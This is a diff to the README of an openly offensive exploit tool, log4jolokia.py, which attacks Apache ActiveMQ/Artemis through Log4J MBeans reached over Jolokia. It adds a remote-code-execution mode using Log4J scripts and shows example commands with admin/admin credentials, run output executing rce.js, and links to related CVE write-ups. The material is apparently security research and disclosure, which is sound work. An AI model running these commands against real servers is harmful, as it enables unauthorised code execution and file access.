@@ -29,10 +29,11 @@ options:
 
 **Note:** Depending on what mode you select the help will differ in some sections. 
 
-The program has the following 3 exploitation modes:
-- Read files
+The program has the following 4 exploitation modes:
+- Read files + SSRF
 - Write files
 - RCE via uploading and executing JAR files
+- RCE via [Scripts](https://logging.apache.org/log4j/2.12.x/manual/configuration.html#Scripts)
 
 #### Read files:
 
@@ -223,3 +224,58 @@ If you agree with the above enter "yes" to continue: yes
 ```
 
 **Note:** As stated in the "WARNING", once you have successfully loaded a JVM TI Agent JAR (return code: 0), redoing the subsequent requests with new/modified JARs (that are valid) will result in the re-execution of only the initaily/first loaded JAR.
+
+#### Execute Scripts:
+
+By using the functionality presented in the "write_file" module, we will write an arbitrary JAR on the target system and then use the "jvmtiAgentLoad([Ljava.lang.String;)" function in order to execute arbitrary Java code.
+
+**Note:** In order for this exploit to work Log4J need to be configured to allow the respective script type (by default no scripts are allowed).
+
+Help - Execute Script Specific Parameters:
+```
+$ python3 log4jolokia.py exec_script http://a -h
+
+  ***TRUNCATED***
+
+  -sf [SCRIPT_FILE], --script_file [SCRIPT_FILE]
+                        Path to local file containing the script to be executed on the target (Use only with mode: exec_script)
+  -l [LANGUAGE], --language [LANGUAGE]
+                        Language of the script to be executed (E.g. javascript, groovy, beanshell, etc.) (Use only with mode: exec_script)
+
+Example command:
+	python3 log4jolokia.py exec_script http://127.0.0.1:8161/console/jolokia/ -sf rce.js -l javascript -u admin -p admin -H 'Origin: http://localhost'
+```
+
+Example - Execute Script:
+```
+$ python3 log4jolokia.py exec_script http://127.0.0.1:8161/console/jolokia/ -sf rce.js -l javascript -u admin -p admin -H 'Origin: http://localhost'
+[.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=561b61ed
+
+[!!!] WARNING: You are about to execute a javascript script from the "rce.js" file. 
+Keep in mind that this script will be triggered multiple times.
+
+If you agree with the above enter "yes" to continue: yes
+[.] Reading javascript script from rce.js
+[.] Using setConfigText to load the Log4J XML configuration
+[+] Successfully called setConfigText()
+[+] The script should have been successfully executed
+```
+
+**Note:** This mode loades the respective script, but has no way of knowing if once the script is loaded it is successfully executed or silently fails.
+
+### Additional Resources:
+
+Manual exploitation exemple of the "read_file" mode:
+- [CVE-2022-41678: Dangerous MBeans Accessible via Jolokia API in Apache ActiveMQ](https://github.com/mbadanoiu/CVE-2022-41678)
+- [CVE-2023-50780 - Initial Report for Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20Initial%20Report.pdf)
+
+Manual exploitation exemple of the "write_file" mode resulting in RCE:
+- [Write arbitrary JSP in Apache ActiveMQ Classic - PDF](https://github.com/mbadanoiu/CVE-2022-41678/blob/main/Apache%20ActiveMQ%20-%20CVE-2022-41678.pdf)
+- [Write WAR and restart Jetty in Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20WAR%20%2B%20Restart%20Vector.pdf)
+
+Manual exploitation exemple of the "exec_jar" mode: 
+- [CVE-2023-50780 - JAR + jvmtiAgentLoad in Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20JAR%20%2B%20jvmtiAgentLoad.pdf)
+
+Manual exploitation exemple of the "exec_script" mode: 
+- [MAL-011: Log4J Misconfiguration Allows Malicious JavaScript in Red Hat AMQ](https://github.com/mbadanoiu/MAL-011)
